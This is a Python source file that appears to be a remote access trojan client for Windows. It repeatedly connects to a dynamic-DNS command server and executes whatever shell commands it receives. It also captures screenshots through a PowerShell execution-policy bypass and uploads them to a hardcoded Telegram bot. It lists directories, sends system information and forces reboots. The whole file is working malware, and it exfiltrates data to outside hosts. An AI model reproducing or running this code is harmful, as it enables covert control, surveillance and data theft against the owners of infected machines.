import socket
import sys
import time
import subprocess
import requests
import os
host = 'dimagamera.ddns.net'
port = 81

while True:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	data = "Connected"
	try:

		a = s.recv(1024)
		a = a.decode()
		if a == '/cmd':
			cmd = s.recv(1024)
			cmd = cmd.decode()
			cmd_process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
			cmd_process = cmd_process.stdout + cmd_process.stderr
			s.send(cmd_process)

		elif a == '/screen':
			try:
				screen = ['<# :',
				'  @echo off', 
				'    powershell /nop /ex bypass^', 
				'    "&{[ScriptBlock]::Create((gc \'%~f0\') -join [Char]10).Invoke()}"',
				'  exit /b',
				'#>', 
				'(New-Object -ComObject Shell.Application).MinimizeAll()',
				'Add-Type -AssemblyName System.Windows.Forms', 
				'$scr = [Windows.Forms.SystemInformation]::VirtualScreen',
					'$bmp = New-Object Drawing.Bitmap $scr.Width, $scr.Height',
					'$gfx = [Drawing.Graphics]::FromImage($bmp)',
					'$gfx.CopyFromScreen($scr.Location, [Drawing.Point]::Empty, $scr.Size)', 
					'$gfx.Dispose()', 
					'$bmp.Save(".\screenshot.png")', 
					'$bmp.Dispose()']
				bat = open('screen.bat', 'w')
				for item in screen:
					bat.write(item+'\n')
				bat.close()
				subprocess.run('screen.bat', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				photo = open(r"screenshot.png", 'rb')
				files = {'document': photo}
				requests.post("https://api.telegram.org/bot1656016658:AAGxJpjEaZ--T1eDc4wUc8GS3NXQ1fNcJ2w/sendDocument?chat_id=330710135", files=files)
				photo.close()
				os.remove('screen.bat')
				os.remove('screenshot.png')
			except:
				pass

		elif a == '/mkdir':
			dir = s.recv(1024)
			dir = dir.decode()
			os.system('mkdir '+ str(dir))

		elif a == "/dir":
			num = s.recv(1024)
			num = num.decode()
			if num == '1':
				c = s.recv(1024)
				c = c.decode()
				if c == '1':
					print('111111111111111111111')
					d = os.listdir()
					f = open('files.txt', 'w')
					for item in d:
						f.write(item+'\n')
					f.close()
					f = open('files.txt','rb')
					while True:
						a = f.read(1024)
						if not a:
							break
						s.send(a)
					f.close()
					os.remove('files.txt')
				elif c == '2':
					print('222222222222222222')
					d = s.recv(1024)
					d = d.decode()
					d = os.listdir(d)
					f = open('files.txt', 'w')
					for item in d:
						f.write(item+'\n')
					f.close()
					f = open('files.txt','rb')
					while True:
						a = f.read(1024)
						if not a:
							break
						s.send(a)
					f.close()
					os.remove('files.txt')					

		elif a == "/sysinfo":
			cmd_process = subprocess.run('systeminfo', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
			cmd_process = cmd_process.stdout + cmd_process.stderr
			s.send(cmd_process)

		elif a == "/poff":
			os.system('shutdown /r /f /t 0')
	except:
		pass
